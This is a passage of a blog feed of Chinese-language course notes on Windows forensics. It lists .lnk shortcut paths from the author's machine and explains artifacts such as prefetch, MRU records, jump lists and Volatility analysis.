&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>c:&lt;span style="color:#ae81ff">\U&lt;/span>sers&lt;span style="color:#ae81ff">\B&lt;/span>ernie&lt;span style="color:#ae81ff">\A&lt;/span>ppData&lt;span style="color:#ae81ff">\L&lt;/span>ocal&lt;span style="color:#ae81ff">\M&lt;/span>icrosoft&lt;span style="color:#ae81ff">\W&lt;/span>indows&lt;span style="color:#ae81ff">\W&lt;/span>inX&lt;span style="color:#ae81ff">\G&lt;/span>roup2&lt;span style="color:#ae81ff">\2&lt;/span> - Search.lnk
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>c:&lt;span style="color:#ae81ff">\U&lt;/span>sers&lt;span style="color:#ae81ff">\B&lt;/span>ernie&lt;span style="color:#ae81ff">\A&lt;/span>ppData&lt;span style="color:#ae81ff">\L&lt;/span>ocal&lt;span style="color:#ae81ff">\M&lt;/span>icrosoft&lt;span style="color:#ae81ff">\W&lt;/span>indows&lt;span style="color:#ae81ff">\W&lt;/span>inX&lt;span style="color:#ae81ff">\G&lt;/span>roup2&lt;span style="color:#ae81ff">\3&lt;/span> - Windows Explorer.lnk
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>c:&lt;span style="color:#ae81ff">\U&lt;/span>sers&lt;span style="color:#ae81ff">\B&lt;/span>ernie&lt;span style="color:#ae81ff">\A&lt;/span>ppData&lt;span style="color:#ae81ff">\L&lt;/span>ocal&lt;span style="color:#ae81ff">\M&lt;/span>icrosoft&lt;span style="color:#ae81ff">\W&lt;/span>indows&lt;span style="color:#ae81ff">\W&lt;/span>inX&lt;span style="color:#ae81ff">\G&lt;/span>roup2&lt;span style="color:#ae81ff">\4&lt;/span> - Control Panel.lnk
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>c:&lt;span style="color:#ae81ff">\U&lt;/span>sers&lt;span style="color:#ae81ff">\B&lt;/span>ernie&lt;span style="color:#ae81ff">\A&lt;/span>ppData&lt;span style="color:#ae81ff">\L&lt;/span>ocal&lt;span style="color:#ae81ff">\M&lt;/span>icrosoft&lt;span style="color:#ae81ff">\W&lt;/span>indows&lt;span style="color:#ae81ff">\W&lt;/span>inX&lt;span style="color:#ae81ff">\G&lt;/span>roup2&lt;span style="color:#ae81ff">\5&lt;/span> - Task Manager.lnk
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>c:&lt;span style="color:#ae81ff">\U&lt;/span>sers&lt;span style="color:#ae81ff">\B&lt;/span>ernie&lt;span style="color:#ae81ff">\A&lt;/span>ppData&lt;span style="color:#ae81ff">\L&lt;/span>ocal&lt;span style="color:#ae81ff">\M&lt;/span>icrosoft&lt;span style="color:#ae81ff">\W&lt;/span>indows&lt;span style="color:#ae81ff">\W&lt;/span>inX&lt;span style="color:#ae81ff">\G&lt;/span>roup3&lt;span style="color:#ae81ff">\0&lt;/span>1a - Windows PowerShell.lnk
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>c:&lt;span style="color:#ae81ff">\U&lt;/span>sers&lt;span style="color:#ae81ff">\B&lt;/span>ernie&lt;span style="color:#ae81ff">\A&lt;/span>ppData&lt;span style="color:#ae81ff">\L&lt;/span>ocal&lt;span style="color:#ae81ff">\M&lt;/span>icrosoft&lt;span style="color:#ae81ff">\W&lt;/span>indows&lt;span style="color:#ae81ff">\W&lt;/span>inX&lt;span style="color:#ae81ff">\G&lt;/span>roup3&lt;span style="color:#ae81ff">\0&lt;/span>2a - Windows PowerShell.lnk
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>c:&lt;span style="color:#ae81ff">\U&lt;/span>sers&lt;span style="color:#ae81ff">\B&lt;/span>ernie&lt;span style="color:#ae81ff">\A&lt;/span>ppData&lt;span style="color:#ae81ff">\L&lt;/span>ocal&lt;span style="color:#ae81ff">\M&lt;/span>icrosoft&lt;span style="color:#ae81ff">\W&lt;/span>indows&lt;span style="color:#ae81ff">\W&lt;/span>inX&lt;span style="color:#ae81ff">\G&lt;/span>roup3&lt;span style="color:#ae81ff">\0&lt;/span>&lt;span style="color:#ae81ff">3&lt;/span> - Computer Management.lnk
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>c:&lt;span style="color:#ae81ff">\U&lt;/span>sers&lt;span style="color:#ae81ff">\B&lt;/span>ernie&lt;span style="color:#ae81ff">\A&lt;/span>ppData&lt;span style="color:#ae81ff">\L&lt;/span>ocal&lt;span style="color:#ae81ff">\M&lt;/span>icrosoft&lt;span style="color:#ae81ff">\W&lt;/span>indows&lt;span style="color:#ae81ff">\W&lt;/span>inX&lt;span style="color:#ae81ff">\G&lt;/span>roup3&lt;span style="color:#ae81ff">\0&lt;/span>&lt;span style="color:#ae81ff">4&lt;/span> - Disk Management.lnk
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>c:&lt;span style="color:#ae81ff">\U&lt;/span>sers&lt;span style="color:#ae81ff">\B&lt;/span>ernie&lt;span style="color:#ae81ff">\A&lt;/span>ppData&lt;span style="color:#ae81ff">\L&lt;/span>ocal&lt;span style="color:#ae81ff">\M&lt;/span>icrosoft&lt;span style="color:#ae81ff">\W&lt;/span>indows&lt;span style="color:#ae81ff">\W&lt;/span>inX&lt;span style="color:#ae81ff">\G&lt;/span>roup3&lt;span style="color:#ae81ff">\0&lt;/span>4-1 - NetworkStatus.lnk
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>c:&lt;span style="color:#ae81ff">\U&lt;/span>sers&lt;span style="color:#ae81ff">\B&lt;/span>ernie&lt;span style="color:#ae81ff">\A&lt;/span>ppData&lt;span style="color:#ae81ff">\L&lt;/span>ocal&lt;span style="color:#ae81ff">\M&lt;/span>icrosoft&lt;span style="color:#ae81ff">\W&lt;/span>indows&lt;span style="color:#ae81ff">\W&lt;/span>inX&lt;span style="color:#ae81ff">\G&lt;/span>roup3&lt;span style="color:#ae81ff">\0&lt;/span>&lt;span style="color:#ae81ff">5&lt;/span> - Device Manager.lnk
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>c:&lt;span style="color:#ae81ff">\U&lt;/span>sers&lt;span style="color:#ae81ff">\B&lt;/span>ernie&lt;span style="color:#ae81ff">\A&lt;/span>ppData&lt;span style="color:#ae81ff">\L&lt;/span>ocal&lt;span style="color:#ae81ff">\M&lt;/span>icrosoft&lt;span style="color:#ae81ff">\W&lt;/span>indows&lt;span style="color:#ae81ff">\W&lt;/span>inX&lt;span style="color:#ae81ff">\G&lt;/span>roup3&lt;span style="color:#ae81ff">\0&lt;/span>&lt;span style="color:#ae81ff">6&lt;/span> - SystemAbout.lnk
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>c:&lt;span style="color:#ae81ff">\U&lt;/span>sers&lt;span style="color:#ae81ff">\B&lt;/span>ernie&lt;span style="color:#ae81ff">\A&lt;/span>ppData&lt;span style="color:#ae81ff">\L&lt;/span>ocal&lt;span style="color:#ae81ff">\M&lt;/span>icrosoft&lt;span style="color:#ae81ff">\W&lt;/span>indows&lt;span style="color:#ae81ff">\W&lt;/span>inX&lt;span style="color:#ae81ff">\G&lt;/span>roup3&lt;span style="color:#ae81ff">\0&lt;/span>&lt;span style="color:#ae81ff">7&lt;/span> - Event Viewer.lnk
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>c:&lt;span style="color:#ae81ff">\U&lt;/span>sers&lt;span style="color:#ae81ff">\B&lt;/span>ernie&lt;span style="color:#ae81ff">\A&lt;/span>ppData&lt;span style="color:#ae81ff">\L&lt;/span>ocal&lt;span style="color:#ae81ff">\M&lt;/span>icrosoft&lt;span style="color:#ae81ff">\W&lt;/span>indows&lt;span style="color:#ae81ff">\W&lt;/span>inX&lt;span style="color:#ae81ff">\G&lt;/span>roup3&lt;span style="color:#ae81ff">\0&lt;/span>&lt;span style="color:#ae81ff">8&lt;/span> - PowerAndSleep.lnk
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>c:&lt;span style="color:#ae81ff">\U&lt;/span>sers&lt;span style="color:#ae81ff">\B&lt;/span>ernie&lt;span style="color:#ae81ff">\A&lt;/span>ppData&lt;span style="color:#ae81ff">\L&lt;/span>ocal&lt;span style="color:#ae81ff">\M&lt;/span>icrosoft&lt;span style="color:#ae81ff">\W&lt;/span>indows&lt;span style="color:#ae81ff">\W&lt;/span>inX&lt;span style="color:#ae81ff">\G&lt;/span>roup3&lt;span style="color:#ae81ff">\0&lt;/span>&lt;span style="color:#ae81ff">9&lt;/span> - Mobility Center.lnk
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>c:&lt;span style="color:#ae81ff">\U&lt;/span>sers&lt;span style="color:#ae81ff">\B&lt;/span>ernie&lt;span style="color:#ae81ff">\A&lt;/span>ppData&lt;span style="color:#ae81ff">\L&lt;/span>ocal&lt;span style="color:#ae81ff">\M&lt;/span>icrosoft&lt;span style="color:#ae81ff">\W&lt;/span>indows&lt;span style="color:#ae81ff">\W&lt;/span>inX&lt;span style="color:#ae81ff">\G&lt;/span>roup3&lt;span style="color:#ae81ff">\1&lt;/span>&lt;span style="color:#ae81ff">0&lt;/span> - AppsAndFeatures.lnk
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>c:&lt;span style="color:#ae81ff">\U&lt;/span>sers&lt;span style="color:#ae81ff">\B&lt;/span>ernie&lt;span style="color:#ae81ff">\A&lt;/span>ppData&lt;span style="color:#ae81ff">\R&lt;/span>oaming&lt;span style="color:#ae81ff">\M&lt;/span>icrosoft&lt;span style="color:#ae81ff">\I&lt;/span>nternet Explorer&lt;span style="color:#ae81ff">\Q&lt;/span>uick Launch&lt;span style="color:#ae81ff">\C&lt;/span>hromium.lnk
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>c:&lt;span style="color:#ae81ff">\U&lt;/span>sers&lt;span style="color:#ae81ff">\B&lt;/span>ernie&lt;span style="color:#ae81ff">\A&lt;/span>ppData&lt;span style="color:#ae81ff">\R&lt;/span>oaming&lt;span style="color:#ae81ff">\M&lt;/span>icrosoft&lt;span style="color:#ae81ff">\I&lt;/span>nternet Explorer&lt;span style="color:#ae81ff">\Q&lt;/span>uick Launch&lt;span style="color:#ae81ff">\F&lt;/span>ile Shredder.lnk
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>c:&lt;span style="color:#ae81ff">\U&lt;/span>sers&lt;span style="color:#ae81ff">\B&lt;/span>ernie&lt;span style="color:#ae81ff">\A&lt;/span>ppData&lt;span style="color:#ae81ff">\R&lt;/span>oaming&lt;span style="color:#ae81ff">\M&lt;/span>icrosoft&lt;span style="color:#ae81ff">\I&lt;/span>nternet Explorer&lt;span style="color:#ae81ff">\Q&lt;/span>uick Launch&lt;span style="color:#ae81ff">\G&lt;/span>oogle Chrome.lnk
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>c:&lt;span style="color:#ae81ff">\U&lt;/span>sers&lt;span style="color:#ae81ff">\B&lt;/span>ernie&lt;span style="color:#ae81ff">\A&lt;/span>ppData&lt;span style="color:#ae81ff">\R&lt;/span>oaming&lt;span style="color:#ae81ff">\M&lt;/span>icrosoft&lt;span style="color:#ae81ff">\I&lt;/span>nternet Explorer&lt;span style="color:#ae81ff">\Q&lt;/span>uick Launch&lt;span style="color:#ae81ff">\M&lt;/span>icrosoft Edge.lnk
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>c:&lt;span style="color:#ae81ff">\U&lt;/span>sers&lt;span style="color:#ae81ff">\B&lt;/span>ernie&lt;span style="color:#ae81ff">\A&lt;/span>ppData&lt;span style="color:#ae81ff">\R&lt;/span>oaming&lt;span style="color:#ae81ff">\M&lt;/span>icrosoft&lt;span style="color:#ae81ff">\I&lt;/span>nternet Explorer&lt;span style="color:#ae81ff">\Q&lt;/span>uick Launch&lt;span style="color:#ae81ff">\O&lt;/span>racle VM VirtualBox.lnk
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>c:&lt;span style="color:#ae81ff">\U&lt;/span>sers&lt;span style="color:#ae81ff">\B&lt;/span>ernie&lt;span style="color:#ae81ff">\A&lt;/span>ppData&lt;span style="color:#ae81ff">\R&lt;/span>oaming&lt;span style="color:#ae81ff">\M&lt;/span>icrosoft&lt;span style="color:#ae81ff">\I&lt;/span>nternet Explorer&lt;span style="color:#ae81ff">\Q&lt;/span>uick Launch&lt;span style="color:#ae81ff">\S&lt;/span>hows Desktop.lnk
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>c:&lt;span style="color:#ae81ff">\U&lt;/span>sers&lt;span style="color:#ae81ff">\B&lt;/span>ernie&lt;span style="color:#ae81ff">\A&lt;/span>ppData&lt;span style="color:#ae81ff">\R&lt;/span>oaming&lt;span style="color:#ae81ff">\M&lt;/span>icrosoft&lt;span style="color:#ae81ff">\I&lt;/span>nternet Explorer&lt;span style="color:#ae81ff">\Q&lt;/span>uick Launch&lt;span style="color:#ae81ff">\W&lt;/span>indow Switcher.lnk
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>c:&lt;span style="color:#ae81ff">\U&lt;/span>sers&lt;span style="color:#ae81ff">\B&lt;/span>ernie&lt;span style="color:#ae81ff">\A&lt;/span>ppData&lt;span style="color:#ae81ff">\R&lt;/span>oaming&lt;span style="color:#ae81ff">\M&lt;/span>icrosoft&lt;span style="color:#ae81ff">\I&lt;/span>nternet Explorer&lt;span style="color:#ae81ff">\Q&lt;/span>uick Launch&lt;span style="color:#ae81ff">\U&lt;/span>ser Pinned&lt;span style="color:#ae81ff">\T&lt;/span>askBar&lt;span style="color:#ae81ff">\A&lt;/span>nyDesk.lnk
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>c:&lt;span style="color:#ae81ff">\U&lt;/span>sers&lt;span style="color:#ae81ff">\B&lt;/span>ernie&lt;span style="color:#ae81ff">\A&lt;/span>ppData&lt;span style="color:#ae81ff">\R&lt;/span>oaming&lt;span style="color:#ae81ff">\M&lt;/span>icrosoft&lt;span style="color:#ae81ff">\I&lt;/span>nternet Explorer&lt;span style="color:#ae81ff">\Q&lt;/span>uick Launch&lt;span style="color:#ae81ff">\U&lt;/span>ser Pinned&lt;span style="color:#ae81ff">\T&lt;/span>askBar&lt;span style="color:#ae81ff">\D&lt;/span>iscord.lnk
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>c:&lt;span style="color:#ae81ff">\U&lt;/span>sers&lt;span style="color:#ae81ff">\B&lt;/span>ernie&lt;span style="color:#ae81ff">\A&lt;/span>ppData&lt;span style="color:#ae81ff">\R&lt;/span>oaming&lt;span style="color:#ae81ff">\M&lt;/span>icrosoft&lt;span style="color:#ae81ff">\I&lt;/span>nternet Explorer&lt;span style="color:#ae81ff">\Q&lt;/span>uick Launch&lt;span style="color:#ae81ff">\U&lt;/span>ser Pinned&lt;span style="color:#ae81ff">\T&lt;/span>askBar&lt;span style="color:#ae81ff">\E&lt;/span>xcel.lnk
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>c:&lt;span style="color:#ae81ff">\U&lt;/span>sers&lt;span style="color:#ae81ff">\B&lt;/span>ernie&lt;span style="color:#ae81ff">\A&lt;/span>ppData&lt;span style="color:#ae81ff">\R&lt;/span>oaming&lt;span style="color:#ae81ff">\M&lt;/span>icrosoft&lt;span style="color:#ae81ff">\I&lt;/span>nternet Explorer&lt;span style="color:#ae81ff">\Q&lt;/span>uick Launch&lt;span style="color:#ae81ff">\U&lt;/span>ser Pinned&lt;span style="color:#ae81ff">\T&lt;/span>askBar&lt;span style="color:#ae81ff">\F&lt;/span>ile Explorer.lnk
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>c:&lt;span style="color:#ae81ff">\U&lt;/span>sers&lt;span style="color:#ae81ff">\B&lt;/span>ernie&lt;span style="color:#ae81ff">\A&lt;/span>ppData&lt;span style="color:#ae81ff">\R&lt;/span>oaming&lt;span style="color:#ae81ff">\M&lt;/span>icrosoft&lt;span style="color:#ae81ff">\I&lt;/span>nternet Explorer&lt;span style="color:#ae81ff">\Q&lt;/span>uick Launch&lt;span style="color:#ae81ff">\U&lt;/span>ser Pinned&lt;span style="color:#ae81ff">\T&lt;/span>askBar&lt;span style="color:#ae81ff">\F&lt;/span>irefox.lnk
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>c:&lt;span style="color:#ae81ff">\U&lt;/span>sers&lt;span style="color:#ae81ff">\B&lt;/span>ernie&lt;span style="color:#ae81ff">\A&lt;/span>ppData&lt;span style="color:#ae81ff">\R&lt;/span>oaming&lt;span style="color:#ae81ff">\M&lt;/span>icrosoft&lt;span style="color:#ae81ff">\I&lt;/span>nternet Explorer&lt;span style="color:#ae81ff">\Q&lt;/span>uick Launch&lt;span style="color:#ae81ff">\U&lt;/span>ser Pinned&lt;span style="color:#ae81ff">\T&lt;/span>askBar&lt;span style="color:#ae81ff">\L&lt;/span>INE &lt;span style="color:#f92672">(&lt;/span>2&lt;span style="color:#f92672">)&lt;/span>.lnk
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>c:&lt;span style="color:#ae81ff">\U&lt;/span>sers&lt;span style="color:#ae81ff">\B&lt;/span>ernie&lt;span style="color:#ae81ff">\A&lt;/span>ppData&lt;span style="color:#ae81ff">\R&lt;/span>oaming&lt;span style="color:#ae81ff">\M&lt;/span>icrosoft&lt;span style="color:#ae81ff">\I&lt;/span>nternet Explorer&lt;span style="color:#ae81ff">\Q&lt;/span>uick Launch&lt;span style="color:#ae81ff">\U&lt;/span>ser Pinned&lt;span style="color:#ae81ff">\T&lt;/span>askBar&lt;span style="color:#ae81ff">\P&lt;/span>owerPoint.lnk
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>c:&lt;span style="color:#ae81ff">\U&lt;/span>sers&lt;span style="color:#ae81ff">\B&lt;/span>ernie&lt;span style="color:#ae81ff">\A&lt;/span>ppData&lt;span style="color:#ae81ff">\R&lt;/span>oaming&lt;span style="color:#ae81ff">\M&lt;/span>icrosoft&lt;span style="color:#ae81ff">\I&lt;/span>nternet Explorer&lt;span style="color:#ae81ff">\Q&lt;/span>uick Launch&lt;span style="color:#ae81ff">\U&lt;/span>ser Pinned&lt;span style="color:#ae81ff">\T&lt;/span>askBar&lt;span style="color:#ae81ff">\S&lt;/span>ublime Text 3.lnk
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>c:&lt;span style="color:#ae81ff">\U&lt;/span>sers&lt;span style="color:#ae81ff">\B&lt;/span>ernie&lt;span style="color:#ae81ff">\A&lt;/span>ppData&lt;span style="color:#ae81ff">\R&lt;/span>oaming&lt;span style="color:#ae81ff">\M&lt;/span>icrosoft&lt;span style="color:#ae81ff">\I&lt;/span>nternet Explorer&lt;span style="color:#ae81ff">\Q&lt;/span>uick Launch&lt;span style="color:#ae81ff">\U&lt;/span>ser Pinned&lt;span style="color:#ae81ff">\T&lt;/span>askBar&lt;span style="color:#ae81ff">\T&lt;/span>ask Manager.lnk
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>c:&lt;span style="color:#ae81ff">\U&lt;/span>sers&lt;span style="color:#ae81ff">\B&lt;/span>ernie&lt;span style="color:#ae81ff">\A&lt;/span>ppData&lt;span style="color:#ae81ff">\R&lt;/span>oaming&lt;span style="color:#ae81ff">\M&lt;/span>icrosoft&lt;span style="color:#ae81ff">\I&lt;/span>nternet Explorer&lt;span style="color:#ae81ff">\Q&lt;/span>uick Launch&lt;span style="color:#ae81ff">\U&lt;/span>ser Pinned&lt;span style="color:#ae81ff">\T&lt;/span>askBar&lt;span style="color:#ae81ff">\T&lt;/span>he Interactive Disassembler &lt;span style="color:#f92672">(&lt;/span>2&lt;span style="color:#f92672">)&lt;/span>.lnk
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>c:&lt;span style="color:#ae81ff">\U&lt;/span>sers&lt;span style="color:#ae81ff">\B&lt;/span>ernie&lt;span style="color:#ae81ff">\A&lt;/span>ppData&lt;span style="color:#ae81ff">\R&lt;/span>oaming&lt;span style="color:#ae81ff">\M&lt;/span>icrosoft&lt;span style="color:#ae81ff">\I&lt;/span>nternet Explorer&lt;span style="color:#ae81ff">\Q&lt;/span>uick Launch&lt;span style="color:#ae81ff">\U&lt;/span>ser Pinned&lt;span style="color:#ae81ff">\T&lt;/span>askBar&lt;span style="color:#ae81ff">\T&lt;/span>he Interactive Disassembler.lnk
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>c:&lt;span style="color:#ae81ff">\U&lt;/span>sers&lt;span style="color:#ae81ff">\B&lt;/span>ernie&lt;span style="color:#ae81ff">\A&lt;/span>ppData&lt;span style="color:#ae81ff">\R&lt;/span>oaming&lt;span style="color:#ae81ff">\M&lt;/span>icrosoft&lt;span style="color:#ae81ff">\I&lt;/span>nternet Explorer&lt;span style="color:#ae81ff">\Q&lt;/span>uick Launch&lt;span style="color:#ae81ff">\U&lt;/span>ser Pinned&lt;span style="color:#ae81ff">\T&lt;/span>askBar&lt;span style="color:#ae81ff">\V&lt;/span>isual Studio Code.lnk
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>c:&lt;span style="color:#ae81ff">\U&lt;/span>sers&lt;span style="color:#ae81ff">\B&lt;/span>ernie&lt;span style="color:#ae81ff">\A&lt;/span>ppData&lt;span style="color:#ae81ff">\R&lt;/span>oaming&lt;span style="color:#ae81ff">\M&lt;/span>icrosoft&lt;span style="color:#ae81ff">\I&lt;/span>nternet Explorer&lt;span style="color:#ae81ff">\Q&lt;/span>uick Launch&lt;span style="color:#ae81ff">\U&lt;/span>ser Pinned&lt;span style="color:#ae81ff">\T&lt;/span>askBar&lt;span style="color:#ae81ff">\V&lt;/span>Mware Workstation Pro.lnk
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>c:&lt;span style="color:#ae81ff">\U&lt;/span>sers&lt;span style="color:#ae81ff">\B&lt;/span>ernie&lt;span style="color:#ae81ff">\A&lt;/span>ppData&lt;span style="color:#ae81ff">\R&lt;/span>oaming&lt;span style="color:#ae81ff">\M&lt;/span>icrosoft&lt;span style="color:#ae81ff">\I&lt;/span>nternet Explorer&lt;span style="color:#ae81ff">\Q&lt;/span>uick Launch&lt;span style="color:#ae81ff">\U&lt;/span>ser Pinned&lt;span style="color:#ae81ff">\T&lt;/span>askBar&lt;span style="color:#ae81ff">\W&lt;/span>ord.lnk
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>c:&lt;span style="color:#ae81ff">\U&lt;/span>sers&lt;span style="color:#ae81ff">\B&lt;/span>ernie&lt;span style="color:#ae81ff">\D&lt;/span>esktop&lt;span style="color:#ae81ff">\T&lt;/span>est-Dragon.lnk
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>c:&lt;span style="color:#ae81ff">\U&lt;/span>sers&lt;span style="color:#ae81ff">\B&lt;/span>ernie&lt;span style="color:#ae81ff">\L&lt;/span>inks&lt;span style="color:#ae81ff">\D&lt;/span>esktop.lnk
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>c:&lt;span style="color:#ae81ff">\U&lt;/span>sers&lt;span style="color:#ae81ff">\B&lt;/span>ernie&lt;span style="color:#ae81ff">\L&lt;/span>inks&lt;span style="color:#ae81ff">\D&lt;/span>ownloads.lnk
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>c:&lt;span style="color:#ae81ff">\U&lt;/span>sers&lt;span style="color:#ae81ff">\B&lt;/span>ernie&lt;span style="color:#ae81ff">\O&lt;/span>neDrive&lt;span style="color:#ae81ff">\P&lt;/span>ersonal Vault.lnk
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>:::&lt;/li>
&lt;/ul>
&lt;h2 id="lab">
 Lab
 &lt;a class="anchor" href="#lab">#&lt;/a>
&lt;/h2>
&lt;p>可以先到&lt;a href="https://code.google.com/archive/p/lnk-parser/downloads">這邊&lt;/a>下載&lt;code>lnk_parser_cmd.exe&lt;/code>&lt;/p></description></item><item><title>TaiwanHolyHigh - Windows Forensics - Windows Artifacts</title><link>https://bernie6401.github.io/docs/security/course/tai.holyhigh/windows-os-forensics/taiwanholyhigh---windows-forensics---windows-artifacts/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/tai.holyhigh/windows-os-forensics/taiwanholyhigh---windows-forensics---windows-artifacts/</guid><description>&lt;h1 id="taiwanholyhigh---windows-forensics---windows-artifacts">
 TaiwanHolyHigh - Windows Forensics - Windows Artifacts
 &lt;a class="anchor" href="#taiwanholyhigh---windows-forensics---windows-artifacts">#&lt;/a>
&lt;/h1>
&lt;p>[TOC]&lt;/p>
&lt;p>:::info
以下引用若無特別說明皆來自於講師的上課簡報
:::&lt;/p>
&lt;h2 id="artifacts-background">
 Artifacts Background
 &lt;a class="anchor" href="#artifacts-background">#&lt;/a>
&lt;/h2>
&lt;blockquote>
&lt;p>使用者操作 Windows 作業系統時會在系統中留下或產生許多行為紀錄，稱之為 Artifacts&lt;/p>&lt;/blockquote>
&lt;ul>
&lt;li>Artifacts種類
&lt;ul>
&lt;li>特定路徑或資料夾:
&lt;ul>
&lt;li>Program Files/Program Data&lt;/li>
&lt;li>Download&lt;/li>
&lt;li>Temp$\to$這在玩分析memory中很常出現&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>電腦特定檔案:
&lt;ul>
&lt;li>LNK&lt;/li>
&lt;li>Email$\to$這在玩分析memory中也很常出現&lt;/li>
&lt;li>系統還原檔(VSS, &lt;a href="https://learn.microsoft.com/zh-tw/windows-server/storage/file-server/volume-shadow-copy-service">volume shadow copy&lt;/a>): 站在藍隊的角度可以藉此知道受害者的遭到入侵的一些證據；站在紅隊的角度可以藉此撈到一些受害者的基敏資料&lt;/li>
&lt;/ul>
&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>Artifacts分析面向
&lt;ul>
&lt;li>檔案Metadata: Timestamp(一般檔案的MAC time至少有兩個, Modify/Access/Create Time)可以藉此知道檔案的異動時間&lt;/li>
&lt;li>應用程式:
&lt;ul>
&lt;li>記憶體: volatility可以針對某個PID dump出執行該process的memory，也是常見的技巧&lt;/li>
&lt;li>&lt;a href="https://read01.com/zh-tw/6nOOGaj.html">Prefetch File&lt;/a>
&lt;blockquote>
&lt;p>一般位於C槽windows文件夾下（&lt;code>C:\Windows\Prefetch&lt;/code>），主要是用來存放系統已訪問的文件預讀信息；一開始創建此文件夾主要是為了加快系統的啟動過程。&lt;/p>&lt;/blockquote>
&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>使用者的操作行為
&lt;ul>
&lt;li>Audit(AD很常碰到的event ID: 4662&amp;hellip;)&lt;/li>
&lt;li>Volatility的console可以看到駭客的command&lt;/li>
&lt;li>Volatility的malfind可以看到惡意注入的payload&amp;hellip;&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>網路行為
&lt;ul>
&lt;li>Volatility的netscan&lt;/li>
&lt;/ul>
&lt;/li>
&lt;/ul>
&lt;/li>
&lt;/ul>
&lt;h2 id="most-recently-usedmru-background">
 Most Recently Used(MRU) Background
 &lt;a class="anchor" href="#most-recently-usedmru-background">#&lt;/a>
&lt;/h2>
&lt;p>就是泛指各種windows存取使用者最近access過的檔案、路徑或網路位置，是一種行為，攻防兩端都會注意的地方&lt;/p>
&lt;ul>
&lt;li>Overview
&lt;img src="https://hackmd.io/_uploads/rk1zs9mfT.png" alt="" />&lt;/li>
&lt;li>攻擊者會留下的足跡: &lt;code>.lnk&lt;/code>, &lt;code>Jump List&lt;/code>, &lt;code>User Assist Registry&lt;/code>, &lt;code>Prefetch&lt;/code>，如果攻擊者想要植入惡意程式，鑑識可以從以上四個地方看出這個intention
&lt;ul>
&lt;li>
&lt;p>&lt;code>Jump List&lt;/code>就有點像是一個shortcut，可以跳到某個地方執行或開啟something&lt;/p></description></item><item><title>TaiwanHolyHigh - Windows Forensics - Windows檔案系統與還原</title><link>https://bernie6401.github.io/docs/security/course/tai.holyhigh/windows-os-forensics/taiwanholyhigh---windows-forensics---windows%E6%AA%94%E6%A1%88%E7%B3%BB%E7%B5%B1%E8%88%87%E9%82%84%E5%8E%9F/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/tai.holyhigh/windows-os-forensics/taiwanholyhigh---windows-forensics---windows%E6%AA%94%E6%A1%88%E7%B3%BB%E7%B5%B1%E8%88%87%E9%82%84%E5%8E%9F/</guid><description>&lt;h1 id="taiwanholyhigh---windows-forensics---windows檔案系統與還原">
 TaiwanHolyHigh - Windows Forensics - Windows檔案系統與還原
 &lt;a class="anchor" href="#taiwanholyhigh---windows-forensics---windows%e6%aa%94%e6%a1%88%e7%b3%bb%e7%b5%b1%e8%88%87%e9%82%84%e5%8e%9f">#&lt;/a>
&lt;/h1>
&lt;p>:::spoiler TOC
[TOC]
:::&lt;/p>
&lt;h2 id="background">
 Background
 &lt;a class="anchor" href="#background">#&lt;/a>
&lt;/h2>
&lt;ul>
&lt;li>
&lt;p>What is cluster or sector?&lt;/p>
&lt;blockquote>
&lt;p>&lt;a href="https://www.pcdvd.com.tw/showthread.php?t=674854">基本磁碟結構&lt;/a>
